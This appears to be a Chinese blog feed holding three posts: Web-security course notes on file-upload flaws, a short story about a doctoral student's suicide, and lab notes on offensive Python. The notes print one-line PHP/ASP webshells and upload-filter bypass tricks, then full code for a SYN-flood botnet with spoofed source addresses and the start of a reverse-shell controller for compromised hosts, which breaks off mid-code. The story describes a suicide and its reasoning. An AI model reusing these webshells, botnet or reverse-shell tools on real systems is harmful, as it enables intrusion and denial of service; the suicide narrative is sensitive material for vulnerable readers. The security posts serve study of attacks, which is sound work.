    <content type="html"><![CDATA[<p>本文内容为极客时间《Web安全攻防实战》课程学习笔记整理。</p><h2 id="第一章-Web安全基础"><a href="#第一章-Web安全基础" class="headerlink" title="第一章. Web安全基础"></a>第一章. Web安全基础</h2><h3 id="一-前端开发"><a href="#一-前端开发" class="headerlink" title="一. 前端开发"></a>一. 前端开发</h3><p>Web开发，前后端分离，首先可以减轻服务器的运算成本，同时减轻开发者人员的学习成本。前端更关注页面表现、速度流畅、兼容性、用户体验等等；后端则强调高并发、高可用、高性能、安全，存储，业务等。</p><p>HTML（超文本标记语言），用于承载网站内容；CSS（层叠样式表），用于表现HTML或XML等文件样式；JS，可以插入HTML页面，基于原型编程、多范式的动态脚本语言，是Web安全中的重点关注之一，由JS引申出XSS攻击、文件上传漏洞，常年占据Owasp Top10。Node.js是运行在服务端的JS，基于Google的V8引擎，是近些年崛起的新的后端框架之一。</p><p>Web App是基于网页技术开发的特定功能应用；常见Web服务器包含Apache HTTP Server，由于跨平台和安全性被广泛使用；Nginx带有负载均衡器和HTTP缓存，主打性能；IIS，是微软主推的服务器；Lighttpd由德国开发，非常低的内存开销，轻量级服务器；Tomcat技术先进、性能稳定且免费，和JAVA联动比较高。</p><p>Web应用框架，定位是减轻网页开发时共性活动的工作负荷，提升代码规范性和可读性。前端比较流行JQuery, Bootstrap，React.js, Vue等等；后端比较流行的是Spring MVC，Django，Flask，Tornado等。大部分框架都会提供一个内置管理后台，进行网站内容、用户等管理。</p><h3 id="二-Web安全总览"><a href="#二-Web安全总览" class="headerlink" title="二. Web安全总览"></a>二. Web安全总览</h3><h4 id="1-协议基础"><a href="#1-协议基础" class="headerlink" title="1.协议基础"></a>1.协议基础</h4><p>HTTP协议工作流程：1）HTTP客户端（浏览器）与Web服务端的HTTP端口建立TCP连接；2）发送HTTP请求（请求行、请求头部、空行和请求数据）；3）服务器接收请求，定位请求资源并返回HTTP响应（状态行、响应头部、空行和响应数据）；4）释放TCP连接，如果connection模式为close，则服务器主动关闭连接，客户端被动关闭，若模式为keepalive，则连接会保持一段时间，可以继续接收请求；5）客户端解析HTML内容。</p><div align="center">  <img src="sec-geek/http.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><p><strong>GET和POST请求</strong>的区别：1）参数：GET请求的参数拼接在URL后面，POST放在请求体里面；2）长度限制：GET有具体长度限制，一般不超过1024KB，POST理论上没有，但浏览器一般有个界限；3）安全：GET的数据明文显示在URL上，安全和私密性差一些。另外，由于浏览器限定，造成应用过程中，GET会产生一个数据包（http header和data一起发出，服务器响应200），POST产生两个（先发送header，服务器响应100，再发送data，服务器响应200）。访问资源等指令型请求是GET的主要应用场景，涉及一定私密性的登录等场景一般是POST。</p><p>HTTP协议，目前主流适用1.1版本，主要有1）GET方法：请求获取资源；2）POST方法：传输一些内容；3）PUT方法：将自己的文件和内容传输到服务器上；4）HEAD方法：只通过报文头部做通信；5）DELETE方法：删除文件；6）OPTIONS方法：了解服务器支持哪些方法；7）CONNECT方法：希望通过哪些隧道协议连接；8）TRACE方法：追踪路径。下图则是HTTP的响应码：</p><div align="center">  <img src="/2020/07/08/sec-geek/HTTP_r.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><h4 id="2-Web安全溯源"><a href="#2-Web安全溯源" class="headerlink" title="2.Web安全溯源"></a>2.Web安全溯源</h4><p>Web是对HTTP协议的实际应用，是由于Web应用的限制没有做好，会导致攻击者利用一些协议逻辑、实现偏差等找到里面的漏洞。Web安全的本质在于信任问题，即前端输入不可信。</p><div align="center">  <img src="/2020/07/08/sec-geek/web-sec.jpg" srcset="/img/loading.gif" width="50%" height="50%" alt="oauth"></div><h4 id="3-Web安全相关工具"><a href="#3-Web安全相关工具" class="headerlink" title="3.Web安全相关工具"></a>3.Web安全相关工具</h4><h5 id="1》客户端工具"><a href="#1》客户端工具" class="headerlink" title="1》客户端工具"></a>1》客户端工具</h5><p><strong>Burp suite</strong>，是一个集成平台框架，包含了很多工具和接口；</p><ul><li>Proxy，一个拦截HTTP(s)的代理服务器，作为浏览器和目标服务器的中间人，可以拦截、查看、修改两个方向上的原始数据流。</li><li>Intruder，一个高度可定制工具，可实现自动化攻击，比如枚举标识符，使用fuzzing技术探测常规漏洞等。</li><li>Repeater，手动操作补发单独HTTP请求，分析应用响应。</li><li>Sequencer，分析不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li><li>Decoder，进行手动执行或对应用程序数据智能编码解码。</li><li>Comparer，通过一些相关的请求和响应得到两项数据的可视化差异。</li></ul><p><strong>Curl</strong>，使用url形式传输数据，多用于抓取网页，网络监控等，解决开发、调试中遇到的问题。</p><p><strong>Postman</strong>，一款网页调试工具，同时支持发送HTTP请求，本质是可视化版本的curl。</p><h5 id="2》网页浏览器插件"><a href="#2》网页浏览器插件" class="headerlink" title="2》网页浏览器插件"></a>2》网页浏览器插件</h5><p><strong>HackBar</strong>，Firefox插件（HackBar Quantum），包含一些常用的工具，主要用于手工渗透某个Web漏洞。可快速构建HTTP请求，实现SQL注入、XSS、加密等。</p><p><strong>Wappalyzer</strong>，网站技术分析插件，了解目标网站使用的平台架构、网站环境、服务器配置、JS框架、编程语言等。</p><h3 id="三-文件上传漏洞"><a href="#三-文件上传漏洞" class="headerlink" title="三. 文件上传漏洞"></a>三. 文件上传漏洞</h3><h4 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h4><p>文件上传时大部分Web应用都具备的功能，之所以会发生漏洞，是开发时验证不足，允许用户上传恶意文件。</p><p>实验使用bWAPP漏洞演示平台，使用docker形式安装。</p><p>PHP语言 eval（）函数。<? php @eval($_POST[‘hacker’]); ?> 一句话木马。其它常用PHP函数还有get_current_user和getcwd，比如：</p><pre><code class="hljs bash"><span class="hljs-comment"># 后面连接中是提前上传到受害服务器的php一句话木马文件</span>curl -d <span class="hljs-string">"hacker=echo get_current_user();"</span> http://127.0.0.1/images/shell.php</code></pre><p>中国菜刀，一款windows平台的集成软件，可以很方便地使用一句话木马获取其它系统权限。</p><p>常用语言的<strong>一句话木马</strong>：</p><pre><code class="hljs bash">&lt;%execute(request(<span class="hljs-string">"value"</span>))%&gt;  <span class="hljs-comment">#asp</span>&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"value"</span>]);?&gt; <span class="hljs-comment">#php</span>&lt;%@ Page Language=<span class="hljs-string">"Jscript"</span>%&gt;   <span class="hljs-comment">#aspx</span>&lt;%<span class="hljs-built_in">eval</span>(Request.Item[<span class="hljs-string">"value"</span>])%&gt; &lt;%<span class="hljs-built_in">eval</span> request(<span class="hljs-string">"value"</span>)%&gt;      <span class="hljs-comment">#其它</span>&lt;%execute request(<span class="hljs-string">"value"</span>)%&gt;&lt;%execute(request(<span class="hljs-string">"value"</span>))%&gt;</code></pre><h4 id="2-绕过"><a href="#2-绕过" class="headerlink" title="2.绕过"></a>2.绕过</h4><p>大多网站会限制用户上传文件的类型，简单的绕过形式是<strong>修改文件后缀</strong></p><p>Nginx解析漏洞，在低版本的Nginx中存在一个由PHP-CGI导致的文件解析漏洞，如果URL中有不存在的文件时，PHP会默认向前解析。比如在 <a href="http://www.xx.com/phpinfo.jpg/1.php中1.php不存在，会默认访问phpinfo.jpg文件，并且是按照php格式解析。" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php中1.php不存在，会默认访问phpinfo.jpg文件，并且是按照php格式解析。</a></p><p>Apache解析漏洞，Apache从右往左判断后缀，并跳过非可识别后缀，比如a.php.test文件，最终会被识别为php文件。</p><p><strong>前端验证绕过</strong>，1）可以通过Burpsuite抓包，然后修改内容后放行；2）可以通过浏览器禁止/删除JS代码的执行。</p><p><strong>.htaccess绕过</strong>，分布式配置文件，提供了一种方式，使配置文件可以随文件夹不同而不同，可以在启用了.htaccess文件的网站，使用此文件类型来绕过限制比较全面的黑名单过滤场景。具体流程：1）上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php.test】;2）上传一句话木马文件，文件名设置为shell.test；3）在浏览器中访问shell.test执行。</p><p><strong>大小写绕过</strong>，针对黑名单，比如将php文件改为pHp，这一条是否适用依赖于系统平台对大小写的敏感性。</p><p><strong>Windows文件流特性绕过</strong>，NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可以创建其它命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。Windows和PHP的结合可以完成通过文件流绕过检测。</p><p><strong>%00截断绕过</strong>，其中%00是在字符串或文件流的结尾。此类方法可以生效的根本原因在于我们可以分别控制 存储路径及文件名称。</p><p><strong>文件头检测绕过</strong>，每种类型的文件都具有常见的文件头格式。可以通过将图片头部和代码部分拼接在一起，完成绕过。</p><h4 id="3-源码审计"><a href="#3-源码审计" class="headerlink" title="3. 源码审计"></a>3. 源码审计</h4><p>对于文件类型检测来说，白名单的安全性要远大于黑名单；平时开发时要使用安全的函数；需要熟悉业务部署环境的OS、Web Server配置。</p><p>本次课程中通过代码审计发现bWapp网站的文件上传漏洞高级安全场景下，无法简单绕过。但可以通过<strong>漏洞链</strong>的方式完成渗透，即漏洞之间的联合利用。基于一个成功上传的一句话木马内容的jpg，联合使用本地/远程文件包含漏洞，完成渗透。</p><h4 id="4-Fuzz"><a href="#4-Fuzz" class="headerlink" title="4.Fuzz"></a>4.Fuzz</h4><p><strong>模糊测试</strong>，是一种软件测试技术，将自动化或半自动化生成的随机数据输入到一个程序中，并监视程序异常。</p><p>在Burp中可以使用intruder模块，选择fuzz的点，在日常中可以积累一个常用的fuzz字典。生产环境中，可以依赖返回的length判断攻击是否成功。</p><p><strong>模糊测试（fuzz）和渗透测试（penetration）</strong>都是属于安全测试，后者一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的能力要求高，成本高，难以大规模使用；而模糊测试可以充分利用机器本身，随机生成和发送数据。但使用时需要注意：1）Fuzz过程中由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃；2）Fuzz过程会产生大量负载；3）安全监测过程中容易由于过多访问出发警报。因此<strong>Fuzz多用于非生产环境</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>课程笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小故事】无法消散</title>
    <link href="/2020/07/07/story-1/"/>
    <url>/2020/07/07/story-1/</url>
    
    <content type="html"><![CDATA[<p>下午四点半，9号楼的小洛死了。</p><p>一个女孩就这么从楼上摔下去，“肝脑涂地”，围观的人们在惋惜中带着阵阵恶心。</p><p>警队来了，120无聊地待在一边。</p><p>小洛家在十一楼，电梯坏了，郝队爬得气喘吁吁，“大夏天的，整这出？”</p><p>小洛和父母同住，郝队进门，家里一尘不染，物件规整，门口立着扫帚，卫生间里的拖布还没晾干。阳台的花鸟，墙上的字画，尤其沙发、床头随处可见的书籍，显示出这家人对文化生活的习惯，不是那种张扬在外的追捧。</p><p>“没有打斗的痕迹，看来是失足坠楼。”</p><p>小洛摔下去的地方正对着家里小阳台的窗户，窗页大敞着，郝队看了看，有齐腰高，如果不是故意爬上去，应该没可能发生意外。奇怪的是，周围窗台也一尘不染，连在附近活动过的痕迹都没有。如果是失足坠落，这窗户就显得过分冷静了。</p><p>“真会给我出难题。”</p><p>在屋内转了一圈，没获得什么实质性线索，郝队转过头来询问家人亲友。据了解，小洛是个成绩不错的学生，正在读博士，平时安安静静，不太可能涉及校园贷、勒索威胁等杂七杂八的事情。小洛有近期和同学出游的计划，前一天洛爸还听见她在电话上兴奋地讨论行程安排。听同学说，小洛最近有一篇论文在写，她还报名了半个月之后的一场线上比赛。哦，还有在小区附近的美容院里预约了两天后的祛痘清洁服务。</p><p>“你家孩子近期遇到什么事情了么？”，  “没有啊，疫情在家，每天平平淡淡的，哪有什么大事。” 洛妈已经哭晕了，都是洛爸在撑着回答。</p><p>“孩子人际交往怎么样？” </p><p>“性格有些内向，打小害羞，爱自己一个人玩，但长大就好很多，上学也结识了几个挺不错的朋友，这几天晚上还经常一起打游戏聊天呢。”</p><p>“那她平时生活状态怎么样？我看她是博士生，是不是课业压力挺大的？”</p><p>“刚读博的时候确实是，她老觉得毕业没希望，打电话回家也都挺沮丧的，后来发了两篇论文，就好很多了。我孩子不可能自杀，她最近也作息规律，偶尔锻炼，跟我俩聊天，都很好的，警官您可得仔细给查查啊，我们都配合，都配合。”</p><p>“不像啊”，郝队心想，“这感觉过得挺好。” 忽然，郝队看到垃圾桶里有个弯了的勺子，是平时做饭用的不锈钢厨具。要不是强外力，勺子不可能拧成这样。刚刚在书房里发现的塑料碎片，应该就是这勺子把手上掉下来的。郝队一阵激动，“这案子应该另有隐情。”</p><p>其实，这就是一场简单的自杀。</p><p>小洛是个理解力远超表达力几个维度的人，这样的人是孤独的，她在期盼与失落中交替，觉得没劲，就走了。</p><p>临走的几个小时前，又一次失落后，小洛很愤怒，刷碗时猛地把勺子砸向地板。看着弯折的勺子和四散的勺柄，她觉得挺好笑的。小洛有很多年，或者甚至说是从小，就不会生气，她好像总能站过去理解对面的逻辑，然后承认现实。但承认现实，安慰不了自己。因为无法被理解，所以时常失落，又因为能理解，所以她的失落没有焦点。</p><p>不如算了吧，通过模仿别人而产生的烟火气，总也不能落地，搞得大家都麻烦。后来她想到，家里人都爱干净，就一一收拾好，还彻底打扫了卫生。以往这种时候，洛妈回来都会表扬几句，小洛听着，觉得“你开心就好”。</p><p>窗台上，小洛一边擦去最后的痕迹，一边记起初中时，在思想政治书上背过，“热爱生活，珍惜生命，回报父母，贡献社会”。真没办法，对不起当时考出的98分。下坠时，她记起，之前和同学讨论起生命的意义、自杀等问题，同学说，“死不死得无所谓，走之前可以把角膜啥的这些器官，捐献给那些想活着的人”。</p><p>我走了，就任你们处置了，最好可以尽快消散掉。不过，好像没大可能，而且又要为当代青年抹黑了，真是不好意思。</p><p>“现在这些年轻人啊，生活条件那么好了，蜜罐里泡大，心理素质就是差。”</p>]]></content>
    
    
    <categories>
      
      <category>原创故事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>瞎写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验楼-信息安全课程系列-Python</title>
    <link href="/2020/07/01/syl-sec/"/>
    <url>/2020/07/01/syl-sec/</url>
    
    <content type="html"><![CDATA[<p>本文中大部分相关知识及代码均来自<a href="https://www.shiyanlou.com/" target="_blank" rel="noopener">实验楼</a>。参考书目《Python绝技：运用Python成为顶级黑客》</p><h2 id="第一课-Python实现DDoS攻击"><a href="#第一课-Python实现DDoS攻击" class="headerlink" title="第一课. Python实现DDoS攻击"></a>第一课. Python实现DDoS攻击</h2><p><strong>关键词</strong>：SYN泛洪，Scapy，argparse模块，socket模块</p><h3 id="一-基础知识"><a href="#一-基础知识" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>SYN泛洪攻击</strong>，一种常见的DoS方式。通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽（CPU满负荷或内存不足）。具体来讲，在TCP三次握手过程中，客户端向服务器发送SYN报文后，不再响应服务器的回应报文。而服务器会在协议栈留出缓冲区存储握手过程，大量的连接请求都挂起在半连接状态。</p><div align="center">  <img src="/2020/07/01/syl-sec/syn.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><p><strong>Scapy3K</strong>，即Scapy的Python3版本。Scapy是一个交互式数据包处理程序，可以发送、嗅探、解析和伪造网络数据包。它可以作为一个独立程序，也可以作为Python的第三方库使用。Scapy构造一个数据包非常简单，如下可构造一个SYN数据包。我们将IP包和TCP包组合在一起，形成一个完整的TCP数据包，其中，flags值为S说明要发送SYN数据包。</p><pre><code class="hljs python">pkt = IP(src=<span class="hljs-string">'202.121.0.12'</span>, dst=<span class="hljs-string">'192.168.0.100'</span>)/TCP(dport=<span class="hljs-number">80</span>,flags=<span class="hljs-string">"S"</span>)send(pkt)</code></pre><pre><code class="hljs python"><span class="hljs-comment">#SCAPY DOS脚本</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> random<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">synFlood</span><span class="hljs-params">(tgt, dPort)</span>:</span>  srcList = [<span class="hljs-string">'201.1.1.2'</span>,<span class="hljs-string">'10.1.1.102'</span>,<span class="hljs-string">'69.1.1.2'</span>,<span class="hljs-string">'125.130.5.199'</span>] <span class="hljs-comment">#伪造源地址</span>  <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> range(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>): <span class="hljs-comment">#随机源端口</span>    index = random.randrange(<span class="hljs-number">4</span>)  <span class="hljs-comment">#随机选取源地址</span>    ipLayer = IP(src=srcList[index], dst=tgt)    tcpLayer = TCP(sport=sPort, dport=dPort,flag=<span class="hljs-string">"S"</span>)    packet = ipLayer / tcpLayer    send(packet)</code></pre><p><strong>argparse命令解析库</strong>，实现程序命令行参数解析。例如，我们规定好Server端控制Client端的命令格式。</p><p><code># -H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;</code></p><p>如下所示，我们创建一个ArgumentParser对象，使用description添加描述信息，使用add_argument添加我们想要解析的参数，其中的dest是通过parse_arg()函数返回的对象中的一个属性的名称，help选项是为了自动生成帮助信息。argparse常用参数<a href="https://docs.python.org/zh-cn/dev/library/argparse.html" target="_blank" rel="noopener">在这里</a>，包括default，required等。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparseparser = argparse.ArgumentParser(description=<span class="hljs-string">'Process some integers'</span>)parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'port'</span>,type=int, help=<span class="hljs-string">'An port number'</span>)parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'host'</span>,type=str, help=<span class="hljs-string">'Ip address of client'</span>)parser.add_argument(<span class="hljs-string">'-c'</span>, dest=<span class="hljs-string">'cmd'</span>,type=str)</code></pre><p><strong>socket模块</strong>，非常方便地实现网络中的信息交换，一般需要指定IP地址，协议类型，端口号即可。如下为客户端和服务器端的代码示例。</p><pre><code class="hljs python"><span class="hljs-comment"># Client</span><span class="hljs-keyword">import</span> sockets = socket.socket(socket.AF_INT, socket.SOCK_STREAM) <span class="hljs-comment">#AF_INT-&gt;IPV4协议，STREAM-&gt;基于流的TCP协议</span>s.connect((<span class="hljs-string">'192.168.0.100'</span>,<span class="hljs-number">7786</span>))</code></pre><p>服务器端绑定一个地址和端口，0.0.0.0表示绑定所有网络地址。开始监听端口后，设定最大连接数为10，最后循环等待新连接，并将已连接的sock对象添加到列表中。accept（）默认是阻塞的，还可以通过settimeout（）设定等待时间或者setblocking（）设定为非阻塞模式。</p><pre><code class="hljs python"><span class="hljs-comment">#Server</span><span class="hljs-keyword">import</span> socketcliList = []s = socket.socket(socket.AF_INT, socket.SOCK_STREAM)s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">7786</span>))s.listen(<span class="hljs-number">10</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    sock, addr = s.accept()    cliList.append(sock)</code></pre><h3 id="二-具体实现"><a href="#二-具体实现" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先在server端需要实现：1）接收客户端连接；2）向客户端发送命令的功能。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> ThreadsocketList = []<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendCmd</span><span class="hljs-params">(cmd)</span>:</span>    print(<span class="hljs-string">'send command...'</span>)    <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> socketList:        sock.send(cmd.encode(<span class="hljs-string">'utf-8'</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waitConnect</span><span class="hljs-params">(s)</span>:</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        sock, addr = s.accept()        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> socketList:            socketList.append(sock)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">58868</span>))    s.listen(<span class="hljs-number">1024</span>)    t = Thread(target=waitConnect, args=(s,)) <span class="hljs-comment">#开新线程等待客户端连接，以免阻塞输入命令</span>    t.start()    <span class="hljs-comment">#等待客户端连入</span>  print(<span class="hljs-string">'Wait for a clinet to connect'</span>)    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> len(socketList):        <span class="hljs-keyword">pass</span>    print(<span class="hljs-string">'A client connected!'</span>)    <span class="hljs-comment">#等待用户输入命令,并发送至客户端</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        print(<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>)        print(<span class="hljs-string">'The command format # -H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;'</span>)        cmd_str = input(<span class="hljs-string">'Please input cmd'</span>)        <span class="hljs-keyword">if</span> len(cmd_str):            <span class="hljs-keyword">if</span> cmd_str[<span class="hljs-number">0</span>] == <span class="hljs-string">'#'</span>:                sendCmd(cmd_str) <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    main()</code></pre><p>在Client需要实现：1）主动连接server端；2）接收server命令后发起攻击。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> os<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *curProcess = <span class="hljs-literal">None</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">synFlood</span><span class="hljs-params">(tgt, dPort)</span>:</span>    srcList = [<span class="hljs-string">'201.1.1.2'</span>,<span class="hljs-string">'10.1.1.102'</span>,<span class="hljs-string">'69.1.1.2'</span>,<span class="hljs-string">'125.130.5.199'</span>] <span class="hljs-comment">#伪造源地址</span>    <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> range(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>): <span class="hljs-comment">#随机源端口</span>      index = random.randrange(<span class="hljs-number">4</span>)  <span class="hljs-comment">#随机选取源地址</span>      ipLayer = IP(src=srcList[index], dst=tgt)      tcpLayer = TCP(sport=sPort, dport=dPort,flag=<span class="hljs-string">"S"</span>)      packet = ipLayer / tcpLayer      send(packet)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmdHandle</span><span class="hljs-params">(sock,parser)</span>:</span><span class="hljs-keyword">global</span> curProcess  <span class="hljs-comment">#全局变量，判断当前是否有进程正在进行攻击</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        data = sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">'utf-8'</span>)        <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:            print(<span class="hljs-string">'The data is empty'</span>)            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">'#'</span>:            <span class="hljs-keyword">try</span>:               options = parser.parse_args(data[<span class="hljs-number">1</span>:].split()) <span class="hljs-comment">#这里学一下</span>               m_host = options.host               m_port = options.port               m_cmd = options.cmd <span class="hljs-comment">#判断是start还是stop</span>               <span class="hljs-keyword">if</span> m_cmd.lower() == <span class="hljs-string">'start'</span>:                    <span class="hljs-keyword">if</span> curProcess != <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> curProcess.is_alive(): <span class="hljs-comment">#重新发动攻击</span>                        curProcess.terminate()                        curProcess = <span class="hljs-literal">None</span>                        os.system(<span class="hljs-string">'clear'</span>)                    print(<span class="hljs-string">'The synFlood is start'</span>)                    p = Process(target=synFlood, args=(m_host,m_port))                    p.start()                    curProcess = p               <span class="hljs-keyword">elif</span> m_cmd.lower() == <span class="hljs-string">'stop'</span>:                    <span class="hljs-keyword">if</span> curProcess.is_alive():                        curProcess.terminate()                        os.system(<span class="hljs-string">'clear'</span>)            <span class="hljs-keyword">except</span>:                print(<span class="hljs-string">'Failed to perform the command'</span>)                         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">'Process some integers'</span>)parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'port'</span>,type=int, help=<span class="hljs-string">'An port number'</span>)parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'host'</span>,type=str, help=<span class="hljs-string">'Ip address of client'</span>)parser.add_argument(<span class="hljs-string">'-c'</span>, dest=<span class="hljs-string">'cmd'</span>,type=str)        <span class="hljs-keyword">try</span>:        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((<span class="hljs-string">'XXXXXX'</span>, <span class="hljs-number">58868</span>))        print(<span class="hljs-string">'To connected server success'</span>)        print(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)        cmdHandle(s,parse)    <span class="hljs-keyword">except</span>:        print(<span class="hljs-string">'The network connected failed'</span>)        print(<span class="hljs-string">'Plese restart the script'</span>)        sys.exit(<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> __name__ = <span class="hljs-string">'__main__'</span>:    main()</code></pre><h2 id="第二课-Python实现可控肉鸡的反向Shell"><a href="#第二课-Python实现可控肉鸡的反向Shell" class="headerlink" title="第二课. Python实现可控肉鸡的反向Shell"></a>第二课. Python实现可控肉鸡的反向Shell</h2><p><strong>关键词</strong>：subprocess模块，socket模块</p><p>本项目与上一个项目本质相同；区别在于，本项目是肉鸡主动连接控制端后，执行控制端发送过来的任何命令。</p><h3 id="一-基础知识-1"><a href="#一-基础知识-1" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>C/S架构</strong>，很多远程控制工具都是基于C/S架构开发的。通常情况下Client是控制端，Server是被控端。反向连接的意思就是Client作为被控端，尽管在内网中，依然可以通过内网端口映射、动态域名等处理后，进行连接。</p><p><strong>subprocess.Popen()</strong>函数，可以实现，一个新的进程中启动一个子程序，第一个参数是子程序的名字，shell=True说明程序在Shell中执行。stdout，stderr，stdin的值都是subprocess.PIPE表示用管道的形式与子进程交互。</p><h3 id="二-具体实现-1"><a href="#二-具体实现-1" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先，控制端需要实现：1）等待被控端连接；2）给被控端发送Shell命令；3）选择和切换当前要接收Shell命令的肉鸡。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> threadingclientList = []curClient = <span class="hljs-literal">None</span>quitThread = <span class="hljs-literal">False</span>lock = threading.Lock()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wait_connect</span><span class="hljs-params">(sk)</span>:</span>    <span class="hljs-keyword">global</span> clientList    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> quitThread:        <span class="hljs-keyword">if</span> len(clientList) == <span class="hljs-number">0</span>:            print(<span class="hljs-string">'Waiting for connection...'</span>)        sock, addr = sk.accept()        print(<span class="hljs-string">'New client %s is connected'</span> %(addr[<span class="hljs-number">0</span>]))        lock.acquire()        clientList.append((sock, addr))        lock.release()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_client</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">global</span> clientList    <span class="hljs-keyword">global</span> curClient    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(clientList)):        print(<span class="hljs-string">'[%i]-&gt;%s'</span> % (i, str(clientList[i][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])))    print(<span class="hljs-string">'Select a client!'</span>)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        num = input(<span class="hljs-string">'client num:'</span>)        <span class="hljs-keyword">if</span> int(num) &gt;= len(clientList):            print(<span class="hljs-string">'Please input a correct num'</span>)            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">break</span>    curClient = clientList[int(num)]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell_ctrl</span><span class="hljs-params">(socket, addr)</span>:</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        com = input(str(addr[<span class="hljs-number">0</span>]) + <span class="hljs-string">':~#'</span>)        <span class="hljs-keyword">if</span> com == <span class="hljs-string">'!ch'</span>:            select_client()            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">if</span> com == <span class="hljs-string">'!q'</span>:            quietThread = <span class="hljs-literal">True</span>            print(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)            exit(<span class="hljs-number">0</span>)        socket.send(com.encode(<span class="hljs-string">'utf-8'</span>))        data = socket.recv(<span class="hljs-number">1024</span>)        print(data.decode(<span class="hljs-string">'utf-8'</span>)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">7676</span>))    s.listen(<span class="hljs-number">1024</span>)    t = 